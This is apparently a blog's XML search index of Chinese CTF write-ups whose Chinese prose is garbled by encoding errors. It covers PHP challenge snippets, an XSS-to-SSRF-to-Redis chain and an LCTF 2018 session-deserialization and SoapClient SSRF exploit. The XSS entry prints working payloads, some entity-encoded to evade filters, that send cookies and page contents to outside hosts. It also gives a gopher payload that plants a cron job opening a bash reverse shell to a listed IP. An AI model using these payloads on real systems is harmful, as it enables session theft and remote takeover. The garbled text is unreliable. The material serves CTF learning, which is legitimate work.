$this-&gt;createThumbnail(); &#125; function createThumbnail() &#123; $e = stripcslashes( preg_replace( &apos;/[^0-9\\\]/&apos;, &apos;&apos;, isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos; ) ); system(&quot;/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file&quot;); &#125; function __toString() &#123; return &quot;&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;&quot;; &#125;&#125;echo (new ImageViewer(&quot;image.png&quot;)); Âè™ÂÖÅËÆ∏Êï∞Â≠óÔºå‰∏î‰ºöÂ∞ÜËΩ¨‰πâÁ¨¶ÂéªÈô§ÔºåËøôÈáåÂèØ‰ª•‰ΩøÁî®8ËøõÂà∂ÁªïËøáÈôêÂà∂Ôºö0\073\163\154\145\145\160\0405\073 Day 20 - Stocking1234567891011121314151617181920212223242526272829303132&lt;?phpset_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);class ImageLoader&#123; public function getResult($uri) &#123; if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123; return &apos;&lt;p&gt;Please enter valid uri&lt;/p&gt;&apos;; &#125; try &#123; $image = file_get_contents($uri); $path = &quot;./images/&quot; . uniqid() . &apos;.jpg&apos;; file_put_contents($path, $image); if (mime_content_type($path) !== &apos;image/jpeg&apos;) &#123; unlink($path); return &apos;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&apos;; &#125; &#125; catch (Exception $e) &#123; return &apos;&lt;p&gt;There was an error: &apos; . $e-&gt;getMessage() . &apos;&lt;/p&gt;&apos;; &#125; return &apos;&lt;img src=&quot;&apos; . $path . &apos;&quot; width=&quot;100&quot;/&gt;&apos;; &#125;&#125;echo (new ImageLoader())-&gt;getResult($_GET[&apos;img&apos;]); ssrfÊó†ËøáÊª§ÔºåÂè™ËÉΩÁõ≤ÊâìÔºåÊàñËÄÖÈÄöËøáÊä•ÈîôÊù•ÁúãÔºö Day 21 - Gift Wrap123456789101112131415161718192021222324252627282930313233declare(strict_types=1);class ParamExtractor &#123; private $validIndices = []; private function indices($input) &#123; $validate = function (int $value, $key) &#123; if ($value &gt; 0) &#123; $this-&gt;validIndices[] = $key; &#125; &#125;; try &#123; array_walk($input, $validate, 0); &#125; catch (TypeError $error) &#123; echo &quot;Only numbers are allowed as input&quot;; &#125; return $this-&gt;validIndices; &#125; public function getCommand($parameters) &#123; $indices = $this-&gt;indices($parameters); $params = []; foreach ($indices as $index) &#123; $params[] = $parameters[$index]; &#125; return implode($params, &apos; &apos;); &#125;&#125;$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&apos;p&apos;]);system(&apos;resizeImg image.png &apos; . $cmd); ÂëΩ‰ª§ÊâßË°åÔºåÁªïËøáÁ±ªÂûãËΩ¨Êç¢ÔºåÊú¨Âú∞Ê≤°Â§çÁé∞ÊàêÂäü.. Day 22 - Chimney12345678910111213141516if (isset($_POST[&apos;password&apos;])) &#123; setcookie(&apos;hash&apos;, md5($_POST[&apos;password&apos;])); header(&quot;Refresh: 0&quot;); exit;&#125;$password = &apos;0e836584205638841937695747769655&apos;;if (!isset($_COOKIE[&apos;hash&apos;])) &#123; echo &apos;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&apos; . &apos;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&apos;; exit;&#125; elseif (md5($_COOKIE[&apos;hash&apos;]) == $password) &#123; echo &apos;Login succeeded&apos;;&#125; else &#123; echo &apos;Login failed&apos;;&#125; ÂæàÊòéÊòæÔºåÁÆÄÂçïÁöÑmd5Ëã•Á±ªÂûãÊØîËæÉÊºèÊ¥û:]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The power of XSS WriteUp]]></title>
    <url>%2F2019%2F02%2F10%2FThe%20power%20of%20XSS%20WriteUp%2F</url>
    <content type="text"><![CDATA[Â≠¶‰π†‰∫Ü‰∏Ä‰∏ãxss-&gt;ssrf-&gt;redis level 1‰∏çÁü•ÈÅì‰∏∫Âï•ÔºåxssÂπ≥Âè∞‰∏ÄÁõ¥Êâì‰∏çÂà∞ÊâãÂä®Â∞±ÂèØ‰ª•..payload:&lt;svg/onload=&quot;document.location=&#39;https://dyfuca.ceye.io/?&#39;+document.cookie&quot;&gt; flag:FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;} Áªô‰∫ÜÊàë‰ª¨‰∏Ä‰∏™ÁÆ°ÁêÜÂëòÁöÑsessionÔºåÊèêÁ§∫Êàë‰ª¨flag2Ë¶ÅÊâìÂÜÖÁΩëÁöÑredis„ÄÇ level 2‰øÆÊîπÊàêadminÁöÑsessionÂêéÔºö ÊâìÊ∫êÁ†Å123&lt;svg/onload=&quot;document.location=&apos;https://dyfuca.ceye.io/?&apos;+btoa(document.body.innerHTML&quot;) // ËøáÊª§‰∫Ü()&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#100;&amp;#121;&amp;#102;&amp;#117;&amp;#99;&amp;#97;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41&quot;&gt; ÁúãÊ∫êÁ†ÅÁúãÂà∞‰∏Ä‰∏™request.phpÔºåËÆ©botÂéªËÆøÈóÆ‰∏Ä‰∏ãÔºåÊâì‰∏Ä‰∏ãhtmlÁöÑÊ∫êÁ†Å„ÄÇ 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; ÂÆû‰ΩìÁºñÁ†ÅÔºö1&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#53;&amp;#53;&amp;#46;&amp;#57;&amp;#52;&amp;#46;&amp;#49;&amp;#55;&amp;#55;&amp;#46;&amp;#49;&amp;#53;&amp;#52;&amp;#58;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59&quot;&gt; Ëß£Á†ÅÂêéÔºö ÊâÄ‰ª•Êàë‰ª¨Áªôrequest.php‰º†ÂÖ•ÁöÑpostÂèÇÊï∞‰∏∫url=ip ÁªìÂêàrobot.txtÊèêÁ§∫ÔºåËØªconfig.php„ÄÇ payload:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; ÁºñÁ†ÅÂêéÔºåÊâìÂà∞ flag2:FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck} level 3ÊèêÁ§∫Êàë‰ª¨ÊâìÂÜÖÁΩëredisÔºåredisÂçèËÆÆ‰ΩøÁî®ÁöÑÊòØÁÆÄÂçïÁöÑÊñáÊú¨ÊµÅ„ÄÇÊØîÂ¶Ç‰∏ãÈù¢ÂèëÈÄÅÁöÑtcpÊµÅÊï∞ÊçÆÔºåÊØèË°å‰ª£Ë°®‰∏ÄÊù°ÂëΩ‰ª§Ôºå‰∏ãÈù¢ÊòØ‰∏§‰∏™setÂëΩ‰ª§12SET x 1SET y 2 ÊòæÁÑ∂ÔºåÂ¶ÇÊûúÊòØgetÂûãÁöÑssrf‰ªñÊó†Ê≥ïÊéßÂà∂ÂçïÁã¨ÁöÑ‰∏ÄË°å(Èô§ÈùûÊúâcrlfÊºèÊ¥û)ÔºåpÁ•ûËøôÁØáÊñáÁ´†ÊèêÂà∞‰∫ÜËøô‰∏™ÁÇπÔºöhttps://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html ÊâÄ‰ª•ËøôÈáåÂæóÁî®GopherÂçèËÆÆÔºåÂèØ‰ª•‰ª•getÂΩ¢ÂºèÂèëËµ∑postËØ∑Ê±Ç Áî®popherusÁîüÊàê‰∫Ü‰∏™ÂºπshellÁöÑpayloadÔºö1gopher://localhost:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A payload: 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:5555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;);&quot;&gt; ‰ΩÜÊòØÂºπ‰∏çÂõûÊù•.. exp:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55556/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);&quot;&gt; Â§ÑÁêÜ‰∏Ä‰∏ãflagÊ†ºÂºè1234567891011121314# coding:utf-8file = open(&quot;flag.txt&quot;)tmp = []while 1: line = file.readline() tmp.append(line.replace(&quot;\n&quot;, &quot;&quot;)) if not line: break passflag = &quot;&quot;for i in range(0, tmp.__len__())[::-1]: flag += tmp[i] print(flag) ÂÜçÈôÑ‰∏äÂ§ÑÁêÜÈ™åËØÅÁ†ÅÁöÑËÑöÊú¨Ôºö1234567891011121314import hashlib strs = &apos;00000&apos;def md5(s): return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()def main(): for i in range(100000,100000000): tmp = &quot;3f81ef4c8455e281&quot;+str(i) a = md5(tmp) if a[0:5] == strs: print(i) exit(0) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LCTF 2018 Babyphp's revenge]]></title>
    <url>%2F2019%2F02%2F10%2FLCTF%202018%20Babyphp's%20revenge%2F</url>
    <content type="text"><![CDATA[ÁªßÁª≠Â°´Âùë.. ‰∏ÄÔºö soap ssrf soapÊúçÂä°ÊòØ‰ªÄ‰πàÔºüÁÆÄÂçïËÄåË®ÄÂç≥‰∏ÄÁßçÈÄö‰ø°ÊñπÂºè ÁâπÂæÅÂú®phpinfo‰∏≠ÂèØ‰ª•ÁúãÂà∞ Âà©Áî®Êù°‰ª∂ÊúâÂèØÊéßÁöÑÁÇπÂéªÂèçÂ∫èÂàóÂåñË∞ÉÁî®soapclientÁ±ªËøõË°åSSRF ÈÇ£‰πà‰∏∫‰ªÄ‰πàË¶ÅÈÄâÊã©‰ΩøÁî®soapclientËøô‰∏™Á±ªÂë¢Ôºü Â¶ÇÊûúÂºÄÂêØ‰∫ÜsoapÊúçÂä°ÔºåsoapclientÁ±ªÂ∞±ÊòØphpÁöÑÂÜÖÁΩÆÁ±ª ‰ªéphpÊñáÊ°£‰∏≠ÂèØ‰ª•ÁúãÂà∞ÔºåÂÖ∂Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫$UrlÔºåËøôÂ∞±‰∏∫‰πãÂêéÁöÑssrf‰Ωú‰∏∫Èì∫Âû´ ÂÖ∂Ê¨°ÂΩìÊï∞ÊçÆË¢´ÂèçÂ∫èÂàóÂåñÂêéÔºåÂÖ∂ÂØπË±°ËøòË¶ÅË∞ÉÁî®‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÁ±ªÔºå‰ª•Ë∞ÉÁî®soapclientÁöÑ__callÊñπÊ≥ï ÂêåÊó∂ËØ•Á±ª__callÊñπÊ≥ïËøòÊúâcrlfÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂÖ∑‰ΩìÂàÜÊûêËßÅÔºöhttps://xz.aliyun.com/t/2148 Â¶Ç‰ΩïËß¶ÂèëssrfÂë¢ÔºüÂèÇËÄÉÔºö https://xz.aliyun.com/t/2148#toc-0 https://php.net/manual/zh/soapclient.soapclient.php ËØ•Á±ªÂÆû‰æãÂåñÁöÑÊó∂ÂÄôÊúâ‰∏§‰∏™ÂèÇÊï∞ÔºöÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊéßÂà∂ÊòØÂê¶‰∏∫WSDLÊ®°Âºè„ÄÇÂ¶ÇÊûú‰∏∫NULLÔºåÂ∞±ÊòØnon-WSDLÊ®°Âºè„ÄÇÂ¶ÇÊûúÊòØÈùûwsdlÊ®°ÂºèÔºåÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂ∞±‰ºöÂØπoptions‰∏≠ÁöÑurlËøõË°åËøúÁ®ãsoapËØ∑Ê±Ç„ÄÇÂ¶ÇÊûúÊòØwsdlÊ®°ÂºèÔºåÂú®Â∫èÂàóÂåñ‰πãÂâçÂ∞±‰ºöÂØπ$urlÂèÇÊï∞ËøõË°åËØ∑Ê±ÇÔºå‰ªéËÄåÊó†Ê≥ïÂèØÊéßÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ Êú¨Âú∞Â§çÁé∞Ôºö‰ª£Á†ÅÔºö123456&lt;?php$location = &apos;https://155.94.177.154:6666/&apos;;$a = new SoapClient(null, array(&apos;location&apos; =&gt; $location ,&apos;uri&apos; =&gt; &apos;123&apos;));$auth= unserialize(serial1ize($a));$auth-&gt;aa();echo &quot;1&quot;; Âè¶‰∏ÄÂè∞vps‰∏äÂºÄÂêØÁõëÂê¨Ôºö ÊâßË°åÔºö vpsÁõëÂê¨Âà∞Ôºö ÂèØ‰ª•ÁúãÂà∞Âú®soapÂ∫ìÂèëÈÄÅÁöÑxmlÊï∞ÊçÆÂú®Êï∞ÊçÆÂåÖÁöÑpostÂ§ÑÔºåÊâÄ‰ª•Ëøô‰∏™ÁöÑÂ±ÄÈôêÂú®‰∫é‰∏ÄËà¨Âè™ËÉΩÊâìgetÂΩ¢ÁöÑssrf„ÄÇ ÂêéÊù•Âú®l3m0nÂ∏àÂÇÖÁöÑÂçöÂÆ¢‰∏äÁúãÂà∞ÂèØ‰ª•ÂèëpostËØ∑Ê±ÇÁöÑÊÄùË∑ØÔºöhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html ‰∫åÔºöphp sessionÂèçÂ∫èÂàóÂåñÂÖ∂Ê†∏ÂøÉÂéüÁêÜÂú®‰∫éphpÂú®Â≠òÂÇ®Â∫èÂàóÂåñ$_SESSIONÊï∞ÊçÆÂºïÊìéÂíåÂèçÂ∫èÂàóÂåñËØ•Êï∞ÊçÆÁöÑÂºïÊìé‰∏ç‰∏ÄÊ†∑ÂØºËá¥„ÄÇ Âà©Áî®Êù°‰ª∂Ôºö Âú®Âêå‰∏ÄÁΩëÁ´ôËÉΩÂêåÊó∂Âá∫Áé∞‰∏§Áßç‰∏çÂêåÁöÑsessionÈÖçÁΩÆÊñπÂºèÔºö 1session.serialize_handler=php_serialize|php $_SESSIONÂÄºÂèØÊéß Êª°Ë∂≥‰ª•‰∏äÂá†ÁÇπÂç≥Á≠â‰ª∑‰∫éÊàë‰ª¨ÂØπunserialize()ÁöÑÂèÇÊï∞ÂèØÊéß„ÄÇ php.ini‰∏≠ÁöÑÈÖçÁΩÆÔºö1234session.save_path=&quot;D:\xampp\tmp&quot; Ë°®ÊòéÊâÄÊúâÁöÑsessionÊñá‰ª∂ÈÉΩÊòØÂ≠òÂÇ®Âú®xampp/tmp‰∏ãsession.save_handler=files Ë°®ÊòésessionÊòØ‰ª•Êñá‰ª∂ÁöÑÊñπÂºèÊù•ËøõË°åÂ≠òÂÇ®ÁöÑsession.auto_start=0 Ë°®ÊòéÈªòËÆ§‰∏çÂêØÂä®sessionsession.serialize_handler=php --ÂÆö‰πâÁî®Êù•Â∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñÁöÑÂ§ÑÁêÜÂô®ÂêçÂ≠ó„ÄÇÈªòËÆ§‰ΩøÁî®php session.serialize_handlerÁöÑÂÖ∂‰ªñÂá†ÁßçÈÖçÁΩÆÈ°πÔºö123php_binary:Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêçÁöÑÈïøÂ∫¶ÂØπÂ∫îÁöÑASCIIÂ≠óÁ¨¶+ÈîÆÂêç+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄºphp:Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêç+Á´ñÁ∫ø+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂ§ÑÁêÜÁöÑÂÄºphp_serialize(php&gt;5.5.4):Â≠òÂÇ®ÊñπÂºèÊòØÔºåÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº ‰ΩøÁî®session.serialize_handler=php_serializeÔºö1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; ËØ•ÊñπÂºèÂú®Â∫èÂàóÂåñÊï∞ÊçÆÂâçÂä†‰∫Üa:1: ËÄå‰ΩøÁî®ÈªòËÆ§ÈÖçÁΩÆÊó∂(session.serialize_handler=php)Ôºö1234&lt;?php//ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; phpÂºïÊìéÂ∞ÜÁ´ñÁ∫ø(|)Â∞ÜÂÖ∂ÂàÜÂâ≤Êàê‰∏§ÈÉ®ÂàÜÔºåÂâçÈù¢‰∏∫ÈîÆÂêçÔºåÂêéÈù¢‰∏∫Â∫èÂàóÂåñÊï∞ÊçÆ ‰∏§ËÄÖÁöÑÂ∑ÆÂºÇÂú®‰∫éÁî®phpÊñπÂºèÊó∂‰ª•|ÂàÜÂâ≤ÔºåÂ¶ÇÊûúÊàë‰ª¨Âú®php_serializeÂ≠òÂÖ•ÁöÑÊï∞ÊçÆÂ∏¶Êúâ|ÔºåËÄåÂèñÂá∫Êï∞ÊçÆÊó∂‰ΩøÁî®phpÂºïÊìéÔºåÂàô‰ºöÂØºËá¥Â∫èÂàóÂåñÊï∞ÊçÆÂú®ÁªèËøáphpÂºïÊìéÊó∂Ë¢´ÂèçÂ∫èÂàóÂåñÂºïÂèëÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ ÊºèÊ¥ûÂ§çÁé∞demoÔºö1.php1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;passer6y&quot;]=$_GET[&quot;a&quot;]; 2.php12345678910111213&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125; ÊûÑÈÄ†payloadÔºö123456789101112131415161718&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125;$a = new aa();echo serialize($a); //O:2:&quot;aa&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;echo &quot;\n\n&quot;;echo urlencode(serialize($a)); payload: https://ip/?a=|O:2:%22aa%22:1:{s:2:%22hi%22;s:10:%22phpinfo();%22;} ÁÑ∂ÂêéËÆøÈóÆÔºö2.php ÊúÄÂêéÂõûÂà∞È¢òÁõÆÊù•ÁúãÔºåÂàÜÊûê‰∏Ä‰∏ãÈ¢òÁõÆÈÄªËæëÔºõindex.php1234567891011&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[&apos;f&apos;],$_POST);session_start();if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a); flag.php1234567&lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF&#123;******************&#125;&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;$_SESSION[&apos;flag&apos;] = $flag;&#125; Á¨¨‰∏Ä‰∏™call_user_func()ÂáΩÊï∞ÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨Â∞ÜphpÁöÑsessionÂ§ÑÁêÜÊñπÂºèËÆæÁΩÆ‰∏∫php_serializeÔºåËøôÈáåÂèØ‰ª•‰ΩøÁî®session_start()Êù•ÂºÄÂêØÔºå‰ªñÊîØÊåÅ‰∏Ä‰∏™Êï∞ÁªÑÂèÇÊï∞Ôºö ÊâÄ‰ª•Ëøô‰∏ÄÊ≠•Êàë‰ª¨Â∞Ü$_GET[&#39;f&#39;]=session_start,ÁÑ∂ÂêépostÊï∞ÊçÆÔºöserialize_handler=php_serialize ÂÜçÂæÄ‰∏ã$_GET[&#39;name&#39;]ÔºåËøô‰ΩøÂæóÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂sessionÔºåÊâÄ‰ª•Ëøô‰∏ÄÊ≠•‰º†ÂÖ•Êàë‰ª¨ÁöÑsoupÁöÑssrfÂèçÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ ‰ªéflag.php‰∏≠ÂèØÁü•ÔºåflagÊòØÂ≠òÂÇ®Âú®Êàë‰ª¨ÁöÑsession‰∏≠ÁöÑ(ÊàêÂäüËß¶ÂèëÂêéÔºåvar_dump($_SESSION);‰ºöÊòæÁ§∫Âá∫Êàë‰ª¨ÁöÑflag)ÔºåÊâÄ‰ª•Êàë‰ª¨ssrfÁöÑÊó∂ÂÄôË¶ÅÂ∏¶‰∏äsessionÔºåËøôÈáå‰ºöÁî®Âà∞soup ssrfÁöÑcrlfÊºèÊ¥û„ÄÇ ÂΩìÁÑ∂Âú®ËøôÈáåÔºåsoup ssrf ËøòÈúÄË¶Å‰∏ÄÊ≠•ÔºåÂ∞±ÊòØË∞ÉÁî®ÂÖ∂Á±ª‰∏≠ÁöÑ__callÊñπÊ≥ïÔºåËøôÈáåÂèÇËÄÉÊñáÊ°£Ôºö ÊâÄ‰ª•Êàë‰ª¨Â∞ÜÁ≤æÂøÉÊûÑÈÄ†ÁöÑsessionÊï∞ÊçÆÂ≠òÂÖ•ÂêéÔºåÁ¨¨‰∫åÊ¨°ËÆøÈóÆÔºåÂà©Áî®ÂèòÈáèË¶ÜÁõñÂ∞Ü$bÂèòÊàêcall_user_funcÔºåÁÑ∂ÂêéÂ∞±ËÉΩË∞ÉÁî®‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ï(welcome_to_the_lctf2018),‰ªéËÄåËß¶Âèë__callÊñπÊ≥ïÔºåÂΩ¢Êàêssrf„ÄÇ 